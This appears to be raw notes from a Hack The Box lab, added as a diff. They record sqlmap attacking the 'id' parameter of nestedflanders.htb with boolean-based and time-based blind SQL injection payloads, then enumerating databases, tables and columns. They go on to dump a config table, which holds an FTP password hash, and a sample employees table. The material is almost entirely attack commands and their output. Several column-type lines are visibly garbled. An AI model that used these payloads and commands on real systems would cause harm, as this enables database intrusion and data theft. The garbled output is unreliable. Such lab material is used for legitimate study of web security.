@@ -1,0 +1,428 @@
+sqlmap identified the following injection point(s) with a total of 297 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=587' AND 1114=1114 AND 'xigp'='xigp
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind
+    Payload: id=587' OR SLEEP(5) AND 'BMBI'='BMBI
+---
+web application technology: Nginx 1.10.3
+back-end DBMS: MySQL >= 5.0.12
+
+
+GET DATABASE
+root@kali:~# sqlmap -u https://www.nestedflanders.htb/index.php?id=587 --dbs
+
+available databases [2]:
+[*] information_schema
+[*] neddy
+
+GET TABLES OF information_schema
+sqlmap -u https://www.nestedflanders.htb/index.php?id=587 -D information_schema --tables --threads 10
+
+
+[78 tables]
++---------------------------------------+
+| ALL_PLUGINS                           |
+| APPLICABLE_ROLES                      |
+| CHANGED_PAGE_BITMAPS                  |
+| CHARACTER_SETS                        |
+| CLIENT_STATISTICS                     |
+| COLLATIONS                            |
+| COLLATION_CHARACTER_SET_APPLICABILITY |
+| COLUMNS                               |
+| COLUMN_PRIVILEGES                     |
+| ENABLED_ROLES                         |
+| ENGINES                               |
+| EVENTS                                |
+| FILES                                 |
+| GEOMETRY_COLUMNS                      |
+| GLOBAL_STATUS                         |
+| GLOBAL_VARIABLES                      |
+| INDEX_STATISTICS                      |
+| INNODB_BUFFER_PAGE                    |
+| INNODB_BUFFER_PAGE_LRU                |
+| INNODB_BUFFER_POOL_STATS              |
+| INNODB_CHANGED_PAGES                  |
+| INNODB_CMP                            |
+| INNODB_CMPMEM                         |
+| INNODB_CMPMEM_RESET                   |
+| INNODB_CMP_PER_INDEX                  |
+| INNODB_CMP_PER_INDEX_RESET            |
+| INNODB_CMP_RESET                      |
+| INNODB_FT_BEING_DELETED               |
+| INNODB_FT_CONFIG                      |
+| INNODB_FT_DEFAULT_STOPWORD            |
+| INNODB_FT_DELETED                     |
+| INNODB_FT_INDEX_CACHE                 |
+| INNODB_FT_INDEX_TABLE                 |
+| INNODB_LOCKS                          |
+| INNODB_LOCK_WAITS                     |
+| INNODB_METRICS                        |
+| INNODB_MUTEXES                        |
+| INNODB_SYS_COLUMNS                    |
+| INNODB_SYS_DATAFILES                  |
+| INNODB_SYS_FIELDS                     |
+| INNODB_SYS_FOREIGN                    |
+| INNODB_SYS_FOREIGN_COLS               |
+| INNODB_SYS_INDEXES                    |
+| INNODB_SYS_SEMAPHORE_WAITS            |
+| INNODB_SYS_TABLES                     |
+| INNODB_SYS_TABLESPACES                |
+| INNODB_SYS_TABLESTATS                 |
+| INNODB_TABLESPACES_ENCRYPTION         |
+| INNODB_TABLESPACES_SCRUBBING          |
+| INNODB_TRX                            |
+| KEY_CACHES                            |
+| KEY_COLUMN_USAGE                      |
+| PARAMETERS                            |
+| PARTITIONS                            |
+| PLUGINS                               |
+| PROCESSLIST                           |
+| PROFILING                             |
+| REFERENTIAL_CONSTRAINTS               |
+| ROUTINES                              |
+| SCHEMATA                              |
+| SCHEMA_PRIVILEGES                     |
+| SESSION_STATUS                        |
+| SESSION_VARIABLES                     |
+| SPATIAL_REF_SYS                       |
+| STATISTICS                            |
+| SYSTEM_VARIABLES                      |
+| TABLES                                |
+| TABLESPACES                           |
+| TABLE_CONSTRAINTS                     |
+| TABLE_PRIVILEGES                      |
+| TABLE_STATISTICS                      |
+| TRIGGERS                              |
+| USER_PRIVILEGES                       |
+| USER_STATISTICS                       |
+| VIEWS                                 |
+| XTRADB_INTERNAL_HASH_TABLES           |
+| XTRADB_READ_VIEW                      |
+| XTRADB_RSEG                           |
++---------------------------------------+
+
+
+GET TABLES OF DATABASE neddy
+root@kali:~# sqlmap -u https://www.nestedflanders.htb/index.php?id=587 -D neddy --tables --threads 10
+
+
+Database: neddy
+[11 tables]
++--------------+
+| config       |
+| customers    |
+| employees    |
+| filepath     |
+| idname       |
+| offices      |
+| orderdetails |
+| orders       |
+| payments     |
+| productlines |
+| products     |
++--------------+
+
+
+GET COLUMNS OF TABLE CONFIG 
+root@kali:~/HTB/Unattended# sqlmap -u https://www.nestedflanders.htb/index.php?id=587 -D neddy -T config --columns --threads 10 --time-sec 10
+
+
+Database: neddy
+Table: config
+[3 columns]
++--------------+-----------------+
+| Column       | Type            |
++--------------+-----------------+
+| id           | int(6) unsigned |
+| option_name  | varchar(30)     |
+| option_value | varchar(255)    |
++--------------+-----------------+
+
+
+Database: neddy
+Table: customers
+[13 columns]
++------------------------+---------------+
+| Column                 | Type          |
++------------------------+---------------+
+| addressLine1           | varchar(50)   |
+| addressLine2           | varchar(50)   |
+| city                   | varchar(50)   |
+| contactFirstName       | varchar(50)   |
+| contactLastName        | varchar(50)   |
+| country                | varchar(50)   |
+| creditLimit            | decimal(10,2) |
+| customerName           | varchar(50)   |
+| customerNumber         | int(11)       |
+| phone                  | varcha?(5)   |
+| postalCode             | varchar(15)   |
+| salesRepEmployeeNumber | int(11)       |
+| state                  | varchar(50)   |
++------------------------+---------------+
+
+
+Database: neddy
+Table: employees
+[8 columns]
++----------------+--------------+
+| Column         | Type         |
++----------------+--------------+
+| email          | varchar(100) |
+| employeeNumber | int(11)      |
+| extension      | varchar(10)  |
+| firstName      | varchar(50)  |
+| jobTitle       | varchar(.0)  |
+| lastName       | paechal'0)  |
+| officeCode     | carahar(10)  |
+| reportsTo      | int 11)      |
++----------------+--------------+
+
+
+Database: neddy
+Table: filepath
+[2 columns]
++--------+--------------+
+| Column | Type         |
++--------+--------------+
+| path   | varchar(255) |
+| name   | varchar(255) |
++--------+--------------+
+
+
+
+Database: neddy
+Table: idname
+[3 columns]
++----------+--------------+
+| Column   | Type         |
++----------+--------------+
+| disabled | int(11)      |
+| id       | gnt(11)      |
+| name     | varchar(155) |
++----------+--------------+
+
+Database: neddy
+Table: offices
+[9 columns]
++--------------+-------------+
+| Column       | Type        |
++--------------+-------------+
+| officeCde   |
+| addressLine1 | varchar(50) |
+| addressLine2 | varchar(50) |
+| city         | Barcae
+                       50 |
+| country      | varchar(50) |
+| phone        | varbhar',0) |
+| postalCode   | varchar(15) |
+| state        | varchar(50) |
+| territory    | varchar(10) |
++--------------+-------------+
+
+
+Database: neddy
+Table: orderdetails
+[5 columns]
++-----------------+---------------+
+| Column          | Type          |
++-----------------+---------------+
+| orderLineNumber | smallint(6)   |
+| orderNumber     | int(11)       |
+| priceEach       | decimal(10,2) |
+| productCode     | varchar(15)   |
+| quantityOrdered | int(11)       |
++-----------------+---------------+
+
+
+
+Database: neddy
+Table: orders
+[7 columns]
++----------------+-------------+
+| Column         | Type        |
++----------------+-------------+
+| comments       | text        |
+| customerNumber | int(11)     |
+| orderDate      | date        |
+| orderNumber    | int(11)     |
+| requiredDate   | date        |
+| shippedDate    | date        |
+| status         | varchar(15) |
++----------------+-------------+
+
+
+
+
+Database: neddy
+Table: payments
+[4 columns]
++----------------+---------+
+| Column         | Type    |
++----------------+---------+
+| ahount         |
+| chacGNdmber    |
+| customerNumber | int(11) |
+| paymentDate    | date    |
++----------------+---------+
+
+
+Database: neddy
+Table: productlines
+[4 columns]
++-----------------+---------------+
+| Column          | Type          |
++-----------------+---------------+
+| htmlDescription | mediumtext    |
+| image           | mediumblob    |
+| productLine     | varchar(50)   |
+| textDescription | varchar(4000) |
++-----------------+---------------+
+
+
+Database: neddy
+Table: products
+[9 columns]
++--------------------+---------------+
+| Column             | Type          |
++--------------------+---------------+
+| buyPrice           | decimal(10,2) |
+| MSRP               | decimal(10,2) |
+| productCode        | varchar(15)   |
+| productDescription | text          |
+| productLine        | varchar(50)   |
+| productName        | varchar(70)   |
+| productScale       | varchar(10)   |
+| productVendor      | varchar(50)   |
+| quantityInStock    | smallint(6)   |
++--------------------+---------------+
+
+
+
+
+
+DUMP CONFIG TABLE
+root@kali:~# sqlmap -u https://www.nestedflanders.htb/index.php?id=587 -D neddy -T config -C id,option_name,option_value --dump --threads 10 --time-sec 10
+
+Database: neddy
+Table: config
+[52 entries]
++-----+-------------------------+--------------------------------------------------------------------------+
+| id  | option_name             | option_value                                                             |
++-----+-------------------------+--------------------------------------------------------------------------+
+| 54  | offline                 | 0                                                                        |
+| 55  | offline_message         | Site offline, please come back later                                     |
+| 56  | display_offline_message | 0                                                                        |
+| 57  | offline_image           | <blank>                                                                  |
+| 58  | sitename                | NestedFlanders                                                           |
+| 59  | editor                  | tinymce                                                                  |
+| 60  | captcha                 | 0                                                                        |
+| 61  | list_limit              | 20                                                                       |
+| 62  | access                  | 1                                                                        |
+| 63  | debug                   | 0                                                                        |
+| 64  | debug_lang              | 0                                                                        |
+| 65  | dbtype                  | mysqli                                                                   |
+| 66  | host                    | localhost                                                                |
+| 67  | live_site               | <blank>                                                                  |
+| 68  | gzip                    | 0                                                                        |
+| 69  | error_reporting         | default                                                                  |
+| 70  | ftp_host                | 127.0.0.1                                                                |
+| 71  | ftp_port                | 21                                                                       |
+| 72  | ftp_user                | flanders                                                                 |
+| 73  | ftp_pass                | 0e1aff658d8614fd0eac6705bb69fb684f6790299e4cf01e1b90b1a287a94ffcde451466 |
+| 74  | ftp_root                | /                                                                        |
+| 75  | ftp_enable              | 1                                                                        |
+| 76  | offset                  | UTC                                                                      |
+| 77  | mailonline              | 1                                                                        |
+| 78  | mailer                  | mail                                                                     |
+| 79  | mailfrom                | nested@nestedflanders.htb                                                |
+| 80  | fromname                | Neddy                                                                    |
+| 81  | sendmail                | /usr/sbin/sendmail                                                       |
+| 82  | smtpauth                | 0                                                                        |
+| 83  | smtpuser                | <blank>                                                                  |
+| 84  | smtppass                | <blank>                                                                  |
+| 85  | smtppass                | <blank>                                                                  |
+| 86  | checkrelease            | /home/guly/checkbase.pl;/home/guly/checkplugins.pl;                      |
+| 87  | smtphost                | localhost                                                                |
+| 88  | smtpsecure              | none                                                                     |
+| 89  | smtpport                | 25                                                                       |
+| 90  | caching                 | 0                                                                        |
+| 91  | cache_handler           | file                                                                     |
+| 92  | cachetime               | 15                                                                       |
+| 93  | MetaDesc                | <blank>                                                                  |
+| 94  | MetaKeys                | <blank>                                                                  |
+| 95  | MetaTitle               | 1                                                                        |
+| 96  | MetaAuthor              | 1                                                                        |
+| 97  | MetaVersion             | 0                                                                        |
+| 98  | robots                  | <blank>                                                                  |
+| 99  | sef                     | 1                                                                        |
+| 100 | sef_rewrite             | 0                                                                        |
+| 101 | sef_suffix              | 0                                                                        |
+| 102 | unicodeslugs            | 0                                                                        |
+| 103 | feed_limit              | 10                                                                       |
+| 104 | lifetime                | 1                                                                        |
+| 105 | session_handler         | file                                                                     |
++-----+-------------------------+--------------------------------------------------------------------------+
+
+
+
+Database: neddy
+Table: employees
+[23 entries]
++---------------------------------+----------------+-----------+-----------+----------------------+-----------+------------+-----------+
+| email                           | employeeNumber | extension | firstName | jobTitle             | lastName  | officeCode | reportsTo |
++---------------------------------+----------------+-----------+-----------+----------------------+-----------+------------+-----------+
+| abow@classicmodelcars.com       | 1143           | x5428     | Anthony   | Sales Manager (NA)   | Bow       | 1          | 1056      |
+| afixter@classicmodelcars.com    | 1611           | x101      | Andy      | Sales Rep            | Fixter    | 6          | 1088      |
+| bjones@classicmodelcars.com     | 1504           | x102      | Barry     | Sales Rep            | Jones     | 7          | 1102      |
+| dmurphy@classicmodelcars.com    | 1002           | x5800     | Diane     | President            | Murphy    | 1          | NULL      |
+| ftseng@classicmodelcars.com     | 1286           | x2248     | Foon Yue  | Sales Rep            | Tseng     | 3          | 1143      |
+| gbondur@classicmodelcars.com    | 1102           | x5408     | Gerard    | Sale Manager (EMEA)  | Bondur    | 4          | 1056      |
+| ghernande@classicmodelcars.com  | 1370           | x2028     | Gerard    | Sales Rep            | Hernandez | 4          | 1102      |
+| gvanauf@classicmodelcars.com    | 1323           | x4102     | George    | Sales Rep            | Vanauf    | 3          | 1143      |
+| jfirrelli@classicmodelcars.com  | 1076           | x9273     | Jeff      | VP Marketing         | Firrelli  | 1          | 1002      |
+| jfirrelli@classicmodelcars.com  | 1188           | x2173     | Julie     | Sales Rep            | Firrelli  | 2          | 1143      |
+| lbondur@classicmodelcars.com    | 1337           | x6493     | Loui      | Sales Rep            | Bondur    | 4          | 1102      |
+| lbott@classicmodelcars.com      | 1501           | x2311     | Larry     | Sales Rep            | Bott      | 7          | 1102      |
+| ljennings@classicmodelcars.com  | 1165           | x3291     | Leslie    | Sales Rep            | Jennings  | 1          | 1143      |
+| lthompson@classicmodelcars.com  | 1166           | x4065     | Leslie    | Sales Rep            | Thompson  | 1          | 1143      |
+| mgerard@classicmodelcars.com    | 1702           | x2312     | Martin    | Sales Rep            | Gerard    | 4          | 1102      |
+| mnishi@classicmodelcars.com     | 1621           | x101      | Mami      | Sales Rep            | Nishi     | 5          | 1056      |
+| mpatterso@classicmodelcars.com  | 1056           | x4611     | Mary      | VP Sales             | Patterson | 1          | 1002      |
+| pcastillo@classicmodelcars.com  | 1401           | x2759     | Pamela    | Sales Rep            | Castillo  | 4          | 1102      |
+| pmarsh@classicmodelcars.com     | 1612           | x102      | Peter     | Sales Rep            | Marsh     | 6          | 1088      |
+| spatterson@classicmodelcars.com | 1216           | x4334     | Steve     | Sales Rep            | Patterson | 2          | 1143      |
+| tking@classicmodelcars.com      | 1619           | x103      | Tom       | Sales Rep            | King      | 6          | 1088      |
+| wpatterson@classicmodelcars.com | 1088           | x4871     | William   | Sales Manager (APAC) | Patterson | 6          | 1056      |
+| ykato@classicmodelcars.com      | 1625           | x102      | Yoshimi   | Sales Rep            | Kato      | 5          | 1621      |
++---------------------------------+----------------+-----------+-----------+----------------------+-----------+------------+-----------+
+
+
+
+Database: neddy
+Table: filepath
+[3 entries]
++--------------------------------------+---------+
+| path                                 | name    |
++--------------------------------------+---------+
+| 47c1ba4f7b1edf28ea0e2bb250717093.php | about   |
+| 0f710bba8d16303a415266af8bb52fcb.php | contact |
+| 787c75233b93aa5e45c3f85d130bfbe7.php | main    |
++--------------------------------------+---------+
+
+
++----------+-----+-------------+
+| disabled | id  | name        |
++----------+-----+-------------+
+| 1        | 1   | main.php    |
+| 1        | 2   | about.php   |
+| 1        | 3   | contact.php |
+| 0        | 25  | main        |
+| 0        | 465 | about       |
+| 0        | 587 | contact     |
++----------+-----+-------------+
+
